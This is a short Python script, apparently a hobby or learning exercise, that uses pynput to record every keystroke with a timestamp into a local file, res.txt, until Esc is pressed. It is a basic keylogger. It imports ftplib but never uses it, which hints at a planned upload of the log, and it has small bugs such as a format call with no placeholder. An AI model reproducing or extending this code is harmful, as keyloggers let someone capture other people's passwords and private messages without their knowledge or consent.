from pynput.keyboard import Key,Listener
import ftplib
import logging

logdir = "" #the current dir
#for logging into a file 
logging.basicConfig(filename = logdir+"res.txt",level = logging.DEBUG,format = "%(asctime)s:%(message)s")#displays the timestamp and the value in the keyboard event    
def pressing_key(Key):
    try:
        logging.info(str(Key))
    except:
        print("A special key has been pressed ".format(Key))

def releasing_key(key):
    if key==Key.esc:
        return False

print("\nStarted listening..\n")

with Listener(on_press=pressing_key,on_release=releasing_key) as listener:
    listener.join()

print("hello")